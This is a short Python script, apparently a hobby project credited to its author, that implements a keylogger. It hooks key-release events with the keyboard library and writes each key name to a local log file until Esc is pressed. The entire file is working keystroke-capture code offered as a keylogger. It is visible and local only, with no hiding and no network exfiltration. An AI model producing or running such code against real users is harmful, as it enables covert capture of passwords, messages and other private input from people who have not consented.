
import keyboard

def keylogger():
   
    with open("keystrokes_log.txt", "w") as log_file:
        log_file.write("Keylogger Started...\n")
        
      
        keyboard.on_release(callback=lambda event: log_file.write(f"{event.name} pressed.\n"))
        
        print("Keylogger is running. Press 'Esc' to stop...")
        
       
        keyboard.wait("esc")
        
        print("Keylogger stopped.")
        log_file.write("Keylogger Stopped.")
        print("Coded by SWAPNIL SARODE!")

if __name__ == "__main__":
    keylogger()
